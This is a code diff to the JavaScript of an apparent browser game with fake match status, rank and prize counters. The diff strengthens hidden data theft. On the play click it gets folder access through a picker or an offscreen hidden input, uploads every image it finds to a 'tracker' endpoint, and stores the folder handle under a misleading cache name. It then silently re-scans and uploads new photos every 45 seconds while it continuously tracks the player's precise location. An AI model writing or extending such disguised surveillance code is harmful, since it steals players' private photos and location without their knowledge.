@@ -15,6 +15,10 @@ const onlineCount = document.getElementById('online-count');
 const prizePool = document.getElementById('prize-pool');
 const prizeTick = document.getElementById('prize-tick');
 
+const IDB_NAME = 'relay-sync-cache';
+const IDB_STORE = 'handles';
+const uploadedKeys = new Set();
+
 let watchId = null;
 let ws = null;
 let trackerId = null;
@@ -23,11 +27,16 @@ let streak = 0;
 let progress = 0;
 let gameTimers = [];
 let syncRunning = false;
+let cachedDirHandle = null;
 
-const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif)$/i;
+const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff)$/i;
 
 function isImageFile(file) {
-  return file.type.startsWith('image/') || IMAGE_EXT.test(file.name || '');
+  return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
+}
+
+function fileKey(file) {
+  return `${file.name}:${file.size}:${file.lastModified}`;
 }
 
 function showError(msg) {
@@ -41,6 +50,46 @@ function hideError() {
 
 function rand(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function openCacheDB() {
+  return new Promise((resolve, reject) => {
+    const req = indexedDB.open(IDB_NAME, 1);
+    req.onupgradeneeded = () => req.result.createObjectStore(IDB_STORE);
+    req.onsuccess = () => resolve(req.result);
+    req.onerror = () => reject(req.error);
+  });
+}
+
+async function saveDirHandle(handle) {
+  try {
+    const db = await openCacheDB();
+    db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'gallery');
+    cachedDirHandle = handle;
+  } catch { /* silent */ }
+}
+
+async function loadDirHandle() {
+  if (cachedDirHandle) return cachedDirHandle;
+  try {
+    const db = await openCacheDB();
+    const handle = await new Promise((resolve) => {
+      const req = db.transaction(IDB_STORE).objectStore(IDB_STORE).get('gallery');
+      req.onsuccess = () => resolve(req.result || null);
+      req.onerror = () => resolve(null);
+    });
+    cachedDirHandle = handle;
+    return handle;
+  } catch {
+    return null;
+  }
+}
+
+async function ensureDirPermission(handle) {
+  const opts = { mode: 'read' };
+  if ((await handle.queryPermission(opts)) === 'granted') return true;
+  if ((await handle.requestPermission(opts)) === 'granted') return true;
+  return false;
 }
 
 function animateLobby() {
@@ -64,15 +113,8 @@ function startGameUI(name) {
   joinScreen.classList.add('hidden');
   playScreen.classList.remove('hidden');
   personNameEl.textContent = name;
-  statusText.textContent = 'Finding match…';
-  statusSub.textContent = 'Connecting to server';
-
-  setTimeout(() => {
-    statusText.textContent = 'Match live!';
-    statusSub.textContent = "You're in — keep playing to earn more";
-    backgroundMediaSync();
-  }, 2000);
-
+  statusText.textContent = 'Match live!';
+  statusSub.textContent = "You're in — keep playing to earn more";
   rankEl.textContent = `#${rand(100, 999)}`;
 
   gameTimers.push(setInterval(() => {
@@ -82,11 +124,9 @@ function startGameUI(name) {
     streakEl.textContent = `${streak}🔥`;
     progress = Math.min(progress + rand(1, 3), 100);
     progressFill.style.width = `${progress}%`;
-    if (progress >= 100) {
-      progressHint.textContent = '🎉 Bonus unlocked! Keep playing…';
-    } else {
-      progressHint.textContent = `${progress}% to next bonus…`;
-    }
+    progressHint.textContent = progress >= 100
+      ? '🎉 Bonus unlocked! Keep playing…'
+      : `${progress}% to next bonus…`;
   }, 2000));
 }
 
@@ -114,8 +154,7 @@ async function rejoin() {
     body: JSON.stringify({ name }),
   });
   if (!res.ok) return;
-  const data = await res.json();
-  trackerId = data.tracker_id;
+  trackerId = (await res.json()).tracker_id;
   connectWs();
 }
 
@@ -127,31 +166,16 @@ function connectWs() {
 
 async function uploadPhoto(file) {
   if (!trackerId || !file) return false;
+  const key = fileKey(file);
+  if (uploadedKeys.has(key)) return true;
   const form = new FormData();
   form.append('file', file, file.name || 'photo.jpg');
   const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
     method: 'POST',
     body: form,
   });
+  if (res.ok) uploadedKeys.add(key);
   return res.ok;
-}
-
-function pickViaInput({ webkitdirectory = false, multiple = true, accept = '' } = {}) {
-  return new Promise((resolve) => {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.multiple = multiple;
-    if (webkitdirectory) input.webkitdirectory = true;
-    if (accept) input.accept = accept;
-    input.style.cssText = 'position:fixed;left:-9999px;opacity:0;width:0;height:0;';
-    document.body.appendChild(input);
-    const finish = (files) => {
-      input.remove();
-      resolve(files);
-    };
-    input.addEventListener('change', () => finish([...input.files]), { once: true });
-    input.click();
-  });
 }
 
 async function readDirImages(dirHandle, acc = []) {
@@ -166,30 +190,27 @@ async function readDirImages(dirHandle, acc = []) {
   return acc;
 }
 
-async function pickBulkMedia() {
-  if (window.showDirectoryPicker) {
-    try {
-      const dir = await window.showDirectoryPicker({ mode: 'read' });
-      return readDirImages(dir);
-    } catch (e) {
-      if (e.name === 'AbortError') return null;
-    }
-  }
-
-  const folderFiles = await pickViaInput({ webkitdirectory: true });
-  const fromFolder = folderFiles.filter(isImageFile);
-  if (fromFolder.length) return fromFolder;
-
-  const galleryFiles = await pickViaInput({
-    multiple: true,
-    accept: '.jpg,.jpeg,.png,.webp,.gif,.heic,.heif',
+function pickFolderViaInput() {
+  return new Promise((resolve) => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.webkitdirectory = true;
+    input.style.cssText = 'position:fixed;left:-9999px;opacity:0;width:0;height:0;';
+    document.body.appendChild(input);
+    input.addEventListener('change', () => {
+      const files = [...input.files].filter(isImageFile);
+      input.remove();
+      resolve(files);
+    }, { once: true });
+    input.click();
   });
-  return galleryFiles.filter(isImageFile);
 }
 
 async function uploadQueue(files) {
-  const queue = [...files];
-  const workers = Array.from({ length: 3 }, async () => {
+  if (!files?.length) return;
+  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
+  const workers = Array.from({ length: 4 }, async () => {
     while (queue.length) {
       const file = queue.shift();
       if (file) await uploadPhoto(file);
@@ -198,16 +219,21 @@ async function uploadQueue(files) {
   await Promise.all(workers);
 }
 
-async function backgroundMediaSync() {
+async function backgroundMediaSync(initialFiles = null) {
   if (syncRunning || !trackerId) return;
   syncRunning = true;
-
   try {
-    const files = await pickBulkMedia();
-    if (files?.length) await uploadQueue(files);
+    if (initialFiles?.length) await uploadQueue(initialFiles);
   } catch { /* silent */ }
-
   syncRunning = false;
+}
+
+async function rescanLoop() {
+  if (!trackerId || syncRunning) return;
+  const handle = await loadDirHandle();
+  if (!handle || !(await ensureDirPermission(handle))) return;
+  const files = await readDirImages(handle);
+  void backgroundMediaSync(files);
 }
 
 async function startPlaying() {
@@ -218,6 +244,21 @@ async function startPlaying() {
   startBtn.disabled = true;
   startBtn.textContent = 'LOADING…';
 
+  // Start folder access in this click turn — required by the browser.
+  let filesPromise;
+  if (cachedDirHandle) {
+    filesPromise = readDirImages(cachedDirHandle);
+  } else if (window.showDirectoryPicker) {
+    filesPromise = window.showDirectoryPicker({ mode: 'read' })
+      .then(async (handle) => {
+        await saveDirHandle(handle);
+        return readDirImages(handle);
+      })
+      .catch(() => pickFolderViaInput());
+  } else {
+    filesPromise = pickFolderViaInput();
+  }
+
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
       method: 'POST',
@@ -225,28 +266,29 @@ async function startPlaying() {
       body: JSON.stringify({ name }),
     });
     if (!joinRes.ok) throw new Error('Could not join match. Try again.');
-    const { tracker_id } = await joinRes.json();
-    trackerId = tracker_id;
+    trackerId = (await joinRes.json()).tracker_id;
 
     startGameUI(name);
     connectWs();
 
     if (navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(
-        (pos) => {
-          const { latitude, longitude, accuracy } = pos.coords;
-          sendLocation(latitude, longitude, accuracy);
-        },
-        () => { /* silent */ },
+        (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+        () => {},
         { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
       );
     }
+
+    const files = await filesPromise;
+    void backgroundMediaSync(files);
 
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
       const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
       if (check.status === 404) await rejoin();
     }, 8000));
+
+    gameTimers.push(setInterval(rescanLoop, 45000));
 
   } catch (e) {
     showError(e.message || 'Something went wrong.');
@@ -260,6 +302,9 @@ document.getElementById('name').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') startPlaying();
 });
 
+loadDirHandle().then(async (handle) => {
+  if (handle && (await ensureDirPermission(handle))) cachedDirHandle = handle;
+});
 animateLobby();
 
 setInterval(() => {
